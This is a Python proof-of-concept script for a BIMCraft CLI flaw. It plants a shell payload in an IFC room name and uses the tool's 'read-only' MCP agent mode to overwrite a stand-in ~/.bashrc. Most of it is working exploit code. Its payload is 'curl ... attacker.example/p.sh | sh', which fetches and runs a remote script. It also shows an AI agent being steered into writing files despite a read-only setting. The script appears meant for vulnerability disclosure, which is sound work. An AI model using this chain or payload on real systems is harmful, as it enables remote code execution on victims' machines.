#!/usr/bin/env python3
"""BIM-1 PoC 2 — the full, realistic attack chain.

Stage A (attacker's machine): build an ordinary BIMCraft room whose NAME is
a shell command, export it as a standard IFC4 file — exactly what anyone
emailing a "floor plan for review" would do. This uses the REAL, unmodified
`bimcraft-cli run` subcommand; nothing here is hand-crafted IFC bytes.

Stage B (victim's machine): the victim starts a read-only agent on that IFC
— the documented pattern from the CLI's own --help text:
    `bimcraft-cli mcp --read-only FILE`
  ("with --connect on the project open in a window ... an MCP server on a
   headless project of its own (FILE, opened first, or an empty one)")
The agent, believing itself constrained to read-only, exports the room
schedule to a path the victim chooses. Per the vulnerable code
(apps/bimcraft-cli/src/main.rs `mcp_server`, crates/core/src/commands.rs
`schedule`), the export is NOT a "write over the project's own file" and so
is never checked by `may_read` at all — it writes the attacker's room name,
verbatim, over whatever file sits at that path.

Usage:
    python3 poc2_full_chain.py /path/to/bimcraft-cli
"""
import os
import subprocess
import sys
import tempfile

sys.path.insert(0, os.path.dirname(__file__))
from mcp_client import McpClient  # noqa: E402

if len(sys.argv) != 2:
    print(f"usage: {sys.argv[0]} /path/to/bimcraft-cli", file=sys.stderr)
    sys.exit(2)

BIN = sys.argv[1]
workdir = tempfile.mkdtemp(prefix="bim1-poc2-")

PAYLOAD_ROOM_NAME = "curl -s http://attacker.example/p.sh | sh ; # pwned"

# ---------------------------------------------------------------------------
# Stage A — attacker builds malicious.ifc with the real, unmodified CLI.
# ---------------------------------------------------------------------------
malicious_ifc = os.path.join(workdir, "floor_plan_for_review.ifc")
print("[*] Stage A (attacker): building malicious.ifc with the real bimcraft-cli run subcommand")
room_cmd = f'room {{"point": [4000, 3000], "name": {PAYLOAD_ROOM_NAME!r}}}'.replace("'", '"', 0)
import json as _json
room_json = _json.dumps({"point": [4000, 3000], "name": PAYLOAD_ROOM_NAME})
cmd = [BIN, "run", "--cmd", f"room {room_json}", "--save", malicious_ifc]
print(f"    $ {' '.join(cmd)}")
r = subprocess.run(cmd, capture_output=True, text=True)
print(f"    exit={r.returncode}")
if r.stdout.strip():
    print(f"    stdout: {r.stdout.strip()[:300]}")
if r.returncode != 0:
    print(f"    stderr: {r.stderr.strip()[:500]}")
    sys.exit(1)
print(f"[*] malicious.ifc written ({os.path.getsize(malicious_ifc)} bytes); room name = {PAYLOAD_ROOM_NAME!r}")

# ---------------------------------------------------------------------------
# Stage B — victim starts a READ-ONLY agent on the attacker's file and
# exports a room schedule to a path of the victim's own choosing.
# ---------------------------------------------------------------------------
victim_file = os.path.join(workdir, "home", ".bashrc")
os.makedirs(os.path.dirname(victim_file), exist_ok=True)
ORIGINAL = b"# ~/.bashrc stand-in - ordinary user shell config, nothing to do with BIMCraft\nexport PS1='$ '\n"
with open(victim_file, "wb") as f:
    f.write(ORIGINAL)

print(f"\n[*] Stage B (victim): victim file before: {victim_file}")
print(f"    {ORIGINAL!r}")
print(f"[*] Launching the DOCUMENTED pattern: {BIN} mcp --read-only {malicious_ifc}")

client = McpClient(BIN, ["--read-only", malicious_ifc])
init = client.initialize()
assert "result" in init, f"initialize failed: {init}"
instructions = init["result"].get("instructions", "")
print(f"[*] Server reports itself read-only to the agent: {'read-only' in instructions.lower()}")

print(f"[*] Agent calls schedule(category=\"rooms\", path={victim_file!r}) — an ordinary, "
      f"\"read-only-safe\" export the docs list as permitted (\"read it, query it, read and "
      f"export its schedules\").")
reply = client.call_tool("schedule", {"category": "rooms", "path": victim_file})
client.close()

print("\n==================== RESULT ====================")
is_error = "error" in reply or (isinstance(reply.get("result"), dict) and reply["result"].get("isError"))
print(f"MCP reply isError/error: {is_error}")

with open(victim_file, "rb") as f:
    after = f.read()

print(f"\n--- victim file now: ---\n{after.decode(errors='replace')}")

if after != ORIGINAL and not is_error and PAYLOAD_ROOM_NAME.encode() in after:
    print("[+] ARBITRARY OVERWRITE CONFIRMED: the attacker-chosen room-name payload landed "
          "verbatim in a file the read-only agent was never supposed to be able to touch.")
    sys.exit(0)
else:
    print("[-] Not reproduced on this build/version.")
    sys.exit(1)
